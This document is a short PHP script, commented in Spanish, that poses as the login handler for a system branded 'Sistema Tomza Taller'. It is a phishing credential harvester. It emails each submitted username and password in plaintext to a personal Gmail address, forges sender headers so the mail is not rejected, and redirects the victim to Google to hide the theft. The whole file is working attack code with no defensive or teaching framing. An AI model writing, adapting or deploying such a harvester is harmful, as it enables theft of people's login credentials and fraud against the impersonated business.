<?php
// Evitar acceso directo al archivo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos del formulario
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Validar que no estén vacíos
if ($usuario === "" || $password === "") {
    echo "Por favor completa todos los campos.";
    exit;
}

// --------------------------
// Configuración del correo
// --------------------------
$destinatario = "sebastiancq2008@gmail.com"; // Tu correo
$asunto = "Nuevo ingreso - Sistema Tomza Taller";

// Contenido del mensaje
$mensaje = "Datos ingresados:\n\n";
$mensaje .= "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";

// Encabezados para que no lo rechacen
$encabezados = "From: Sistema Tomza <sistema@tomzataller.com>\r\n";
$encabezados .= "Reply-To: no-responder@tomzataller.com\r\n";
$encabezados .= "MIME-Version: 1.0\r\n";
$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Enviar el correo
mail($destinatario, $asunto, $mensaje, $encabezados);

// Redirigir a Google como querés
header("Location: https://www.google.com");
exit;
?>
